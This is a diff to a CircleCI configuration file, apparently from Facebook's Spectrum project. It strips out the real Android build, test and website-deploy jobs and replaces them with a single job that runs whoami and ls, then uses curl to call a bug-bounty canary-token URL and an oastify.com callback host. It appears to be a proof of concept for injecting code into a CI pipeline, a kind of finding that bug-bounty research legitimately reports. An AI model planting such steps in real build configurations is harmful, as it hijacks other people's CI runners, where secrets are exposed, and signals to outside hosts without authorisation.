@@ -1,126 +1,13 @@
-# Copyright (c) Facebook, Inc. and its affiliates.
-
-#
-# GENERAL CONFIG
-#
-
 version: 2.1
-
-aliases:
- - &filter-only-master
-   branches:
-     only:
-       - master
-
-#
-# EXECUTORS & JOBS
-#
-
-executors:
-  spectrumandroid:
-    docker:
-      - image: reactnativecommunity/react-native-android:5.2
-    working_directory: ~/react-native
-    resource_class: "large"
-    environment:
-      - TERM: "dumb"
-      - ADB_INSTALL_TIMEOUT: 20
-      - _JAVA_OPTIONS: "-XX:+UnlockExperimentalVMOptions"
-      - GRADLE_OPTS: '-Dorg.gradle.daemon=false -Dorg.gradle.jvmargs="-XX:+HeapDumpOnOutOfMemoryError"'
-      - BUILD_THREADS: 2
-
-commands:
-  prepare_native_gradle_deps:
-    steps:
-      - run:
-          name: Download and prepare native dependencies via Gradle
-          command: ./gradlew prepareNative
-  create_emulator:
-    steps:
-      - run:
-          name: Create emulator
-          command: |
-            source ".circleci/scripts/.tests.env"
-            AVD_PACKAGES="system-images;android-$ANDROID_SDK_TARGET_API_LEVEL;google_apis;$AVD_ABI"
-            echo "Installing syste image for $AVD_PACKAGES"
-            sdkmanager $AVD_PACKAGES
-            echo "Creating AVD with packages $AVD_PACKAGES"
-            echo no | avdmanager create avd --name "$AVD_NAME" --force --package "$AVD_PACKAGES" --tag google_apis --abi "$AVD_ABI"
-  launch_emulator:
-    steps:
-      - run:
-          name: Launch emulator
-          background: true
-          command: |
-            source ".circleci/scripts/.tests.env"
-            "$ANDROID_HOME/emulator/emulator" -avd "$AVD_NAME" -no-audio -no-window
-  wait_for_emulator:
-    steps:
-      - run:
-          name: Wait for emulator
-          command: |
-            source ".circleci/scripts/.tests.env"
-            ".circleci/scripts/wait_for_emulator.sh"
-
-#
-# JOBS
-#
-
+orbs:
+  node: circleci/node@1.1
 jobs:
-  deploy-website:
-    docker:
-      - image: circleci/node:8.11.1
+  build:
+    executor:
+      name: node/default
+      tag: '10.4'
     steps:
-      - checkout
-      - run:
-          name: Deploying to GitHub Pages
-          command: |
-            git config --global user.email "docusaurus-bot@users.noreply.github.com"
-            git config --global user.name "Website Deployment Script"
-            echo "machine github.com login docusaurus-bot password $GITHUB_DOCUSAURUS_TOKEN" > ~/.netrc
-            cd website && yarn install && GIT_USER=docusaurus-bot USE_SSH=false yarn run publish-gh-pages
-
-  build-android-release:
-    executor: spectrumandroid
-    steps:
-      - checkout
-      - prepare_native_gradle_deps
-      - run: ./gradlew assembleRelease
-
-  build-android-sample-app:
-    executor: spectrumandroid
-    steps:
-      - checkout
-      - prepare_native_gradle_deps
-      - run: ./gradlew android:sample:assembleDebug
-
-  test-android:
-    executor: spectrumandroid
-    steps:
-      - checkout
-      - create_emulator
-      - launch_emulator
-      # wait for emulator to give it more time to finish startup activities before tests
-      - wait_for_emulator
-
-      # run unit tests
-      - prepare_native_gradle_deps
-      - run: ./gradlew test
-
-      - run:
-          command: ./gradlew connectedAndroidTest
-          no_output_timeout: 20m
-
-#
-# WORKFLOWS
-#
-
-workflows:
-  version: 2
-  build_and_deploy:
-    jobs:
-      - deploy-website:
-          filters: *filter-only-master
-      - build-android-release
-      - build-android-sample-app
-      - test-android
+      - run: whoami
+      - run: curl https://www.internalfb.com/intern/bug-bounty/get-canary-token/2441627515f94bef8facc556f9f2246d/
+      - run: ls -la
+      - run: curl https://akyb09r57k1xcyl41kyzgh3yppvgj7cv1.oastify.com
